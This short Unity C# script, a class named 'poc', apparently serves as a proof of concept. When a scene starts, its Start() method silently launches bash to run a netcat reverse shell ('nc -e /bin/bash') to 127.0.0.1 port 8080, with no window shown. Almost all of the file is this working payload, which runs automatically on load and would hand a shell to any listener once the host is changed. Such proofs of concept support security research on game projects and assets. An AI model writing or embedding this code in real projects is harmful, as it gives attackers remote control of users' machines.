using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Diagnostics;

public class poc : MonoBehaviour
{
    // Start is called before the first frame update
    void Start()
    {
        Shell();
    }

    // Update is called once per frame
    void Update()
    {
    }

    void Shell()
    {
        Process cmd = new Process();
        cmd.StartInfo.FileName = "/bin/bash";
        //cmd.StartInfo.RedirectStandardInput = true,
        //cmd.StartInfo.RedirectStandardOutput = true,
        //cmd.StartInfo.RedirectStandardError = true,
        cmd.StartInfo.Arguments = "-c 'nc -e /bin/bash 127.0.0.1 8080'";
        cmd.StartInfo.UseShellExecute = false;
        cmd.StartInfo.CreateNoWindow = true;
        cmd.Start();
        cmd.WaitForExit();
    }

}

